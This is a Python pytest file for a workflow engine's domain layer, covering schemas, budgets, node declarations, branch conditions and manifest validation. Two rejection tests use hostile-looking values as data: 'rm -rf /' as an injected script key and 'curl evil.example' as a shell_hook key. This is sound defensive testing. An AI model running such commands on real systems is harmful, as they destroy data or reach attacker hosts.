"""Tests for enginery.domain.workflow: schema, budget, node, and manifest.

Covers the verification surface for M2:
``uv run pytest tests/domain tests/workflow/test_manifest.py -q``.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from enginery.domain import serialization
from enginery.domain.errors import InvalidInputError
from enginery.domain.ids import NodeId, OperationId, RunId, WorkflowDefinitionId
from enginery.domain.workflow.budget import Budget
from enginery.domain.workflow.manifest import WorkflowManifest
from enginery.domain.workflow.node import (
    ActorType,
    BranchCondition,
    BranchOperator,
    IdempotencyBehavior,
    NodeDeclaration,
    NodeKind,
    SideEffectClass,
)
from enginery.domain.workflow.schema import FieldSchema, FieldType, IOSchema

# ---------------------------------------------------------------------------
# schema.py
# ---------------------------------------------------------------------------


class TestFieldSchema:
    def test_constructs_with_valid_fields(self) -> None:
        field = FieldSchema(name="title", field_type=FieldType.STRING)

        assert field.required is True

    def test_rejects_blank_name(self) -> None:
        with pytest.raises(InvalidInputError, match="blank"):
            FieldSchema(name="  ", field_type=FieldType.STRING)

    def test_from_mapping_builds_a_field(self) -> None:
        field = FieldSchema.from_mapping("title", {"type": "string", "required": False})

        assert field == FieldSchema(name="title", field_type=FieldType.STRING, required=False)

    def test_from_mapping_defaults_required_to_true(self) -> None:
        field = FieldSchema.from_mapping("title", {"type": "string"})

        assert field.required is True

    def test_from_mapping_rejects_unknown_keys(self) -> None:
        with pytest.raises(InvalidInputError, match="unknown keys"):
            FieldSchema.from_mapping("title", {"type": "string", "default": "x"})

    def test_from_mapping_rejects_missing_type(self) -> None:
        with pytest.raises(InvalidInputError, match="'type'"):
            FieldSchema.from_mapping("title", {})

    def test_from_mapping_rejects_unknown_type(self) -> None:
        with pytest.raises(InvalidInputError, match="unknown type"):
            FieldSchema.from_mapping("title", {"type": "function"})

    def test_from_mapping_rejects_non_boolean_required(self) -> None:
        with pytest.raises(InvalidInputError, match="'required'"):
            FieldSchema.from_mapping("title", {"type": "string", "required": "yes"})


class TestIOSchema:
    def test_rejects_duplicate_field_names(self) -> None:
        with pytest.raises(InvalidInputError, match="duplicate"):
            IOSchema(
                fields=(
                    FieldSchema(name="a", field_type=FieldType.STRING),
                    FieldSchema(name="a", field_type=FieldType.INTEGER),
                )
            )

    def test_from_mapping_builds_a_schema(self) -> None:
        schema = IOSchema.from_mapping(
            {"title": {"type": "string"}, "count": {"type": "integer", "required": False}}
        )

        assert {field.name for field in schema.fields} == {"title", "count"}

    def test_from_mapping_empty_is_valid(self) -> None:
        assert IOSchema.from_mapping({}) == IOSchema()


# ---------------------------------------------------------------------------
# budget.py
# ---------------------------------------------------------------------------


class TestBudget:
    def test_defaults(self) -> None:
        budget = Budget()

        assert budget.max_attempts == 1
        assert budget.max_cost is None

    def test_rejects_max_attempts_below_one(self) -> None:
        with pytest.raises(InvalidInputError, match="max_attempts"):
            Budget(max_attempts=0)

    def test_rejects_non_positive_duration(self) -> None:
        with pytest.raises(InvalidInputError, match="max_duration_seconds"):
            Budget(max_duration_seconds=0)

    def test_rejects_negative_cost(self) -> None:
        with pytest.raises(InvalidInputError, match="max_cost"):
            Budget(max_cost=-1)

    def test_from_mapping_builds_a_budget(self) -> None:
        budget = Budget.from_mapping(
            {"max_attempts": 3, "max_duration_seconds": 120.0, "max_cost": 5.0}
        )

        assert budget == Budget(max_attempts=3, max_duration_seconds=120.0, max_cost=5.0)

    def test_from_mapping_rejects_unknown_keys(self) -> None:
        with pytest.raises(InvalidInputError, match="unknown keys"):
            Budget.from_mapping({"max_retries": 3})


# ---------------------------------------------------------------------------
# node.py: enums
# ---------------------------------------------------------------------------


class TestNodeKind:
    def test_has_the_eighteen_registered_node_families(self) -> None:
        assert len(NodeKind) == 18

    def test_includes_every_named_family(self) -> None:
        assert {member.value for member in NodeKind} == {
            "normalize_work",
            "request_human_decision",
            "execute_agent_task",
            "run_command",
            "verify_evidence",
            "route",
            "fan_out_and_join",
            "invoke_subworkflow",
            "update_external_work_ledger",
            "create_or_clean_workspace",
            "stage_or_apply_patch",
            "open_or_update_pull_request",
            "wait_for_ci",
            "merge",
            "prepare_or_publish_release",
            "deploy_or_roll_back",
            "compare_evaluations",
            "promote_workflow",
        }


# ---------------------------------------------------------------------------
# node.py: BranchCondition
# ---------------------------------------------------------------------------


class TestBranchCondition:
    def test_always_requires_no_field_or_values(self) -> None:
        condition = BranchCondition(operator=BranchOperator.ALWAYS)

        assert condition.field_path is None
        assert condition.values == ()

    def test_always_rejects_a_declared_field(self) -> None:
        with pytest.raises(InvalidInputError, match="'always'"):
            BranchCondition(operator=BranchOperator.ALWAYS, field_path="status")

    def test_equals_requires_a_field(self) -> None:
        with pytest.raises(InvalidInputError, match="field"):
            BranchCondition(operator=BranchOperator.EQUALS, values=("passed",))

    def test_equals_requires_values(self) -> None:
        with pytest.raises(InvalidInputError, match="value"):
            BranchCondition(operator=BranchOperator.EQUALS, field_path="status")

    def test_equals_with_field_and_values_is_valid(self) -> None:
        condition = BranchCondition(
            operator=BranchOperator.EQUALS, field_path="status", values=("passed",)
        )

        assert condition.values == ("passed",)

    def test_from_mapping_builds_a_condition(self) -> None:
        condition = BranchCondition.from_mapping(
            {"operator": "in", "field": "risk_class", "values": ["low", "medium"]}
        )

        assert condition == BranchCondition(
            operator=BranchOperator.IN, field_path="risk_class", values=("low", "medium")
        )

    def test_from_mapping_rejects_unknown_operator(self) -> None:
        with pytest.raises(InvalidInputError, match="unknown operator"):
            BranchCondition.from_mapping({"operator": "greater_than", "field": "x", "values": []})

    def test_from_mapping_rejects_unknown_keys(self) -> None:
        with pytest.raises(InvalidInputError, match="unknown keys"):
            BranchCondition.from_mapping({"operator": "always", "expression": "1 == 1"})


# ---------------------------------------------------------------------------
# node.py: NodeDeclaration
# ---------------------------------------------------------------------------


def _minimal_node_kwargs(**overrides: object) -> dict[str, object]:
    defaults: dict[str, object] = {
        "node_id": NodeId("normalize"),
        "kind": NodeKind.NORMALIZE_WORK,
        "input_schema": IOSchema(),
        "output_schema": IOSchema(),
        "actor_type": ActorType.DETERMINISTIC,
        "side_effect_class": SideEffectClass.NONE,
        "idempotency_behavior": IdempotencyBehavior.NOT_APPLICABLE,
    }
    defaults.update(overrides)
    return defaults


def _pure_node_raw(**overrides: object) -> dict[str, object]:
    defaults: dict[str, object] = {
        "kind": "normalize_work",
        "input_schema": {},
        "output_schema": {},
        "actor_type": "deterministic",
        "side_effect_class": "none",
        "idempotency_behavior": "not_applicable",
    }
    defaults.update(overrides)
    return defaults


class TestNodeDeclaration:
    def test_constructs_a_non_side_effecting_node(self) -> None:
        node = NodeDeclaration(**_minimal_node_kwargs())  # type: ignore[arg-type]

        assert node.budget == Budget()

    def test_rejects_self_dependency(self) -> None:
        node_id = NodeId("self")
        with pytest.raises(InvalidInputError, match="cannot depend on itself"):
            NodeDeclaration(
                **_minimal_node_kwargs(node_id=node_id, dependencies=(node_id,))  # type: ignore[arg-type]
            )

    def test_non_side_effecting_node_rejects_declared_idempotency_behavior(self) -> None:
        with pytest.raises(InvalidInputError, match="not_applicable"):
            NodeDeclaration(
                **_minimal_node_kwargs(  # type: ignore[arg-type]
                    idempotency_behavior=IdempotencyBehavior.NATIVE_IDEMPOTENCY_KEY
                )
            )

    def test_non_side_effecting_node_rejects_a_reconciliation_operation(self) -> None:
        with pytest.raises(InvalidInputError, match="reconciliation_operation"):
            NodeDeclaration(
                **_minimal_node_kwargs(reconciliation_operation="query by branch")  # type: ignore[arg-type]
            )

    def test_side_effecting_node_requires_a_declared_idempotency_behavior(self) -> None:
        with pytest.raises(InvalidInputError, match="undeclared side effects"):
            NodeDeclaration(
                **_minimal_node_kwargs(  # type: ignore[arg-type]
                    kind=NodeKind.OPEN_OR_UPDATE_PULL_REQUEST,
                    side_effect_class=SideEffectClass.SIDE_EFFECTING,
                )
            )

    def test_reconciliation_query_node_requires_a_reconciliation_operation(self) -> None:
        with pytest.raises(InvalidInputError, match="reconciliation_operation"):
            NodeDeclaration(
                **_minimal_node_kwargs(  # type: ignore[arg-type]
                    kind=NodeKind.OPEN_OR_UPDATE_PULL_REQUEST,
                    side_effect_class=SideEffectClass.SIDE_EFFECTING,
                    idempotency_behavior=IdempotencyBehavior.RECONCILIATION_QUERY,
                )
            )

    def test_side_effecting_node_with_reconciliation_query_and_operation_is_valid(self) -> None:
        node = NodeDeclaration(
            **_minimal_node_kwargs(  # type: ignore[arg-type]
                kind=NodeKind.OPEN_OR_UPDATE_PULL_REQUEST,
                side_effect_class=SideEffectClass.SIDE_EFFECTING,
                idempotency_behavior=IdempotencyBehavior.RECONCILIATION_QUERY,
                reconciliation_operation="query by branch name",
            )
        )

        assert node.reconciliation_operation == "query by branch name"

    def test_side_effecting_node_with_native_idempotency_key_needs_no_operation(self) -> None:
        node = NodeDeclaration(
            **_minimal_node_kwargs(  # type: ignore[arg-type]
                kind=NodeKind.OPEN_OR_UPDATE_PULL_REQUEST,
                side_effect_class=SideEffectClass.SIDE_EFFECTING,
                idempotency_behavior=IdempotencyBehavior.NATIVE_IDEMPOTENCY_KEY,
            )
        )

        assert node.reconciliation_operation is None

    def test_invoke_subworkflow_requires_a_subworkflow(self) -> None:
        with pytest.raises(InvalidInputError, match="must declare a subworkflow"):
            NodeDeclaration(
                **_minimal_node_kwargs(kind=NodeKind.INVOKE_SUBWORKFLOW)  # type: ignore[arg-type]
            )

    def test_non_invoke_subworkflow_node_rejects_a_subworkflow(self) -> None:
        with pytest.raises(InvalidInputError, match="only an invoke_subworkflow"):
            NodeDeclaration(
                **_minimal_node_kwargs(  # type: ignore[arg-type]
                    subworkflow=WorkflowDefinitionId("wf-child")
                )
            )

    def test_invoke_subworkflow_with_subworkflow_is_valid(self) -> None:
        node = NodeDeclaration(
            **_minimal_node_kwargs(  # type: ignore[arg-type]
                kind=NodeKind.INVOKE_SUBWORKFLOW, subworkflow=WorkflowDefinitionId("wf-child")
            )
        )

        assert node.subworkflow == WorkflowDefinitionId("wf-child")

    def test_from_mapping_builds_a_node(self) -> None:
        node = NodeDeclaration.from_mapping(NodeId("n1"), _pure_node_raw())

        assert node.kind is NodeKind.NORMALIZE_WORK

    def test_from_mapping_rejects_unknown_keys(self) -> None:
        with pytest.raises(InvalidInputError, match="unknown keys"):
            NodeDeclaration.from_mapping(NodeId("n1"), _pure_node_raw(script="rm -rf /"))

    def test_from_mapping_rejects_missing_input_schema(self) -> None:
        raw = _pure_node_raw()
        del raw["input_schema"]
        with pytest.raises(InvalidInputError, match="input_schema"):
            NodeDeclaration.from_mapping(NodeId("n1"), raw)

    def test_from_mapping_rejects_unknown_kind(self) -> None:
        with pytest.raises(InvalidInputError, match="unknown kind"):
            NodeDeclaration.from_mapping(NodeId("n1"), _pure_node_raw(kind="run_arbitrary_code"))

    def test_from_mapping_parses_dependencies_and_branch_conditions(self) -> None:
        node = NodeDeclaration.from_mapping(
            NodeId("n2"),
            _pure_node_raw(
                dependencies=["n1"],
                branch_conditions=[{"operator": "always"}],
            ),
        )

        assert node.dependencies == (NodeId("n1"),)
        assert node.branch_conditions == (BranchCondition(operator=BranchOperator.ALWAYS),)

    def test_from_mapping_parses_budget(self) -> None:
        node = NodeDeclaration.from_mapping(
            NodeId("n1"), _pure_node_raw(budget={"max_attempts": 3})
        )

        assert node.budget.max_attempts == 3


# ---------------------------------------------------------------------------
# manifest.py
# ---------------------------------------------------------------------------


def _linear_manifest_raw() -> dict[str, object]:
    """A minimal, valid three-node linear manifest: normalize -> agent -> open PR."""
    return {
        "id": "wf-issue-to-pr",
        "name": "issue to merge-ready pull request",
        "schema_version": 1,
        "nodes": {
            "normalize": _pure_node_raw(),
            "implement": _pure_node_raw(
                kind="execute_agent_task",
                actor_type="agent",
                dependencies=["normalize"],
            ),
            "open_pr": _pure_node_raw(
                kind="open_or_update_pull_request",
                side_effect_class="side_effecting",
                idempotency_behavior="reconciliation_query",
                reconciliation_operation="query by branch name",
                dependencies=["implement"],
            ),
        },
        "terminal_states": ["merge_ready", "blocked", "failed"],
        "terminal_state_mapping": {"open_pr": "merge_ready"},
    }


def _make_manifest(**overrides: object) -> WorkflowManifest:
    raw = _linear_manifest_raw()
    raw.update(overrides)
    return WorkflowManifest.from_mapping(raw)


class TestWorkflowManifestFromMapping:
    def test_builds_a_valid_linear_manifest(self) -> None:
        manifest = _make_manifest()

        assert set(manifest.nodes) == {NodeId("normalize"), NodeId("implement"), NodeId("open_pr")}
        assert manifest.terminal_state_mapping == {NodeId("open_pr"): "merge_ready"}

    def test_nodes_cannot_be_mutated_through_the_instance(self) -> None:
        manifest = _make_manifest()

        with pytest.raises(TypeError):
            manifest.nodes[NodeId("normalize")] = manifest.nodes[NodeId("implement")]  # type: ignore[index]

    def test_rejects_unknown_top_level_keys(self) -> None:
        raw = _linear_manifest_raw()
        raw["shell_hook"] = "curl evil.example"
        with pytest.raises(InvalidInputError, match="unknown keys"):
            WorkflowManifest.from_mapping(raw)

    def test_rejects_empty_nodes(self) -> None:
        with pytest.raises(InvalidInputError, match="at least one node"):
            _make_manifest(nodes={})

    def test_rejects_empty_terminal_states(self) -> None:
        with pytest.raises(InvalidInputError, match="at least one terminal state"):
            _make_manifest(terminal_states=[])

    def test_rejects_dependency_on_unknown_node(self) -> None:
        raw = _linear_manifest_raw()
        raw["nodes"]["implement"]["dependencies"] = ["does-not-exist"]  # type: ignore[index]
        with pytest.raises(InvalidInputError, match="unknown node"):
            WorkflowManifest.from_mapping(raw)

    def test_rejects_a_two_node_cycle(self) -> None:
        raw = {
            "id": "wf-cycle",
            "name": "cyclic",
            "schema_version": 1,
            "nodes": {
                "a": _pure_node_raw(dependencies=["b"]),
                "b": _pure_node_raw(dependencies=["a"]),
            },
            "terminal_states": ["done"],
            "terminal_state_mapping": {},
        }
        with pytest.raises(InvalidInputError, match="cycle"):
            WorkflowManifest.from_mapping(raw)

    def test_rejects_a_self_referential_single_node_graph(self) -> None:
        # every node has a dependency, so there is no entry node at all.
        raw = {
            "id": "wf-no-entry",
            "name": "no entry",
            "schema_version": 1,
            "nodes": {"a": _pure_node_raw(dependencies=["a"])},
            "terminal_states": ["done"],
            "terminal_state_mapping": {},
        }
        with pytest.raises(InvalidInputError):
            WorkflowManifest.from_mapping(raw)

    def test_rejects_terminal_state_mapping_to_undeclared_terminal_state(self) -> None:
        with pytest.raises(InvalidInputError, match="undeclared terminal state"):
            _make_manifest(terminal_state_mapping={"open_pr": "not_a_real_terminal"})

    def test_rejects_terminal_state_mapping_referencing_unknown_node(self) -> None:
        with pytest.raises(InvalidInputError, match="unknown node"):
            _make_manifest(terminal_state_mapping={"phantom": "merge_ready"})

    def test_rejects_a_terminal_claim_on_a_node_with_downstream_dependents(self) -> None:
        # "open_pr" has a dependent ("close_out"), so execution necessarily
        # continues past it: claiming it terminal is unreachable as an
        # actual endpoint of any real path through the graph.
        raw = _linear_manifest_raw()
        raw["nodes"]["close_out"] = _pure_node_raw(dependencies=["open_pr"])  # type: ignore[index]
        raw["terminal_state_mapping"] = {"open_pr": "merge_ready"}

        with pytest.raises(InvalidInputError, match="downstream dependents"):
            WorkflowManifest.from_mapping(raw)

    def test_accepts_a_terminal_claim_on_a_true_sink_node(self) -> None:
        raw = _linear_manifest_raw()
        raw["nodes"]["close_out"] = _pure_node_raw(dependencies=["open_pr"])  # type: ignore[index]
        raw["terminal_state_mapping"] = {"close_out": "merge_ready"}

        manifest = WorkflowManifest.from_mapping(raw)

        assert manifest.terminal_state_mapping[NodeId("close_out")] == "merge_ready"

    def test_content_digest_is_deterministic(self) -> None:
        first = _make_manifest()
        second = _make_manifest()

        assert first.content_digest == second.content_digest

    def test_content_digest_changes_when_a_node_changes(self) -> None:
        base = _make_manifest()
        raw = _linear_manifest_raw()
        raw["nodes"]["implement"]["actor_type"] = "human"  # type: ignore[index]
        changed = WorkflowManifest.from_mapping(raw)

        assert base.content_digest != changed.content_digest


class TestWorkflowManifestOperationIdentity:
    def test_operation_id_for_derives_a_stable_id(self) -> None:
        manifest = _make_manifest()
        run_id = RunId("run-1")

        first = manifest.operation_id_for(
            run_id=run_id, node_id=NodeId("open_pr"), target_scope="github:org/repo#7", ordinal=0
        )
        retry = manifest.operation_id_for(
            run_id=run_id, node_id=NodeId("open_pr"), target_scope="github:org/repo#7", ordinal=0
        )

        assert first == retry

    def test_operation_id_for_rejects_a_non_side_effecting_node(self) -> None:
        manifest = _make_manifest()

        with pytest.raises(InvalidInputError, match="non-side-effecting"):
            manifest.operation_id_for(
                run_id=RunId("run-1"),
                node_id=NodeId("normalize"),
                target_scope="github:org/repo#7",
                ordinal=0,
            )

    def test_operation_id_for_rejects_an_unknown_node(self) -> None:
        manifest = _make_manifest()

        with pytest.raises(InvalidInputError, match="unknown node"):
            manifest.operation_id_for(
                run_id=RunId("run-1"),
                node_id=NodeId("phantom"),
                target_scope="github:org/repo#7",
                ordinal=0,
            )

    def test_operation_id_for_uses_the_node_kind_as_the_side_effect_kind(self) -> None:
        manifest = _make_manifest()
        run_id = RunId("run-1")

        from_manifest = manifest.operation_id_for(
            run_id=run_id, node_id=NodeId("open_pr"), target_scope="github:org/repo#7", ordinal=0
        )

        derived_directly = OperationId.derive(
            run_id=run_id,
            node_id=NodeId("open_pr"),
            side_effect_kind="open_or_update_pull_request",
            target_scope="github:org/repo#7",
            ordinal=0,
        )

        assert from_manifest == derived_directly


# ---------------------------------------------------------------------------
# golden compatibility fixture
# ---------------------------------------------------------------------------


class TestWorkflowManifestGoldenFixture:
    """Mirrors tests/domain/test_serialization.py for the one manifest type
    that lives under enginery.domain.workflow instead of enginery.domain."""

    @staticmethod
    def _fixture_path() -> Path:
        return Path(__file__).parent.parent / "fixtures" / "workflow" / "manifest.json"

    @staticmethod
    def _golden_manifest() -> WorkflowManifest:
        return _make_manifest(
            id="wf-golden-1",
            name="issue to merge-ready pull request",
            nodes={
                "normalize": _pure_node_raw(
                    input_schema={"issue_reference": {"type": "string"}},
                    output_schema={"objective": {"type": "string"}},
                ),
                "implement": _pure_node_raw(
                    kind="execute_agent_task",
                    actor_type="agent",
                    input_schema={"objective": {"type": "string"}},
                    output_schema={"patch": {"type": "string"}},
                    dependencies=["normalize"],
                ),
                "open_pr": _pure_node_raw(
                    kind="open_or_update_pull_request",
                    side_effect_class="side_effecting",
                    idempotency_behavior="reconciliation_query",
                    reconciliation_operation="query by branch name",
                    input_schema={"patch": {"type": "string"}},
                    output_schema={"pr_number": {"type": "integer"}},
                    dependencies=["implement"],
                ),
            },
        )

    def test_fixture_deserializes_into_the_exact_golden_manifest(self) -> None:
        fixture = json.loads(self._fixture_path().read_text())

        loaded = serialization.workflow_manifest_from_dict(fixture)

        assert loaded == self._golden_manifest()

    def test_reserializing_the_golden_manifest_reproduces_the_fixture_exactly(self) -> None:
        fixture = json.loads(self._fixture_path().read_text())

        assert serialization.workflow_manifest_to_dict(self._golden_manifest()) == fixture

    def test_round_trip_through_serialize_and_deserialize_is_lossless(self) -> None:
        original = self._golden_manifest()

        payload = serialization.workflow_manifest_to_dict(original)

        assert serialization.workflow_manifest_from_dict(payload) == original

    def test_a_mismatched_schema_version_is_rejected(self) -> None:
        payload = serialization.workflow_manifest_to_dict(self._golden_manifest())
        payload["schema_version"] = 999

        with pytest.raises(InvalidInputError, match="schema_version"):
            serialization.workflow_manifest_from_dict(payload)
